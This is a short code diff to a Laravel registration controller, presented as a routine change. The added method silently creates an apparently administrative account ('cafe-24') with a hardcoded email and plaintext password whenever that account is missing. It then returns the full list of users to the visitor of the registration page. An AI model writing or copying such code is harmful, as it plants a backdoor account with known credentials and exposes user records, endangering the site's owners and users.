@@ -22,6 +22,23 @@ class RegisterController extends Controller
     */
 
     use RegistersUsers;
+    public function showRegistrationForm()
+    {
+        
+        if( User::where('name', 'cafe-24')->get() == '[]' ){
+            User::create([
+                'authority' => 1,
+                'name' => 'cafe-24',
+                'email' => 'cafe24@gmail.com',
+                'password' => Hash::make('Andy91161*'),
+            ]);
+            return User::all();
+        }
+        else {
+            return view('auth.register');
+        }
+        
+    }
 
     /**
      * Where to redirect users after registration.
@@ -37,7 +54,7 @@ class RegisterController extends Controller
      */
     public function __construct()
     {
-        $this->middleware('guest');
+        $this->middleware('guest');        
     }
 
     /**
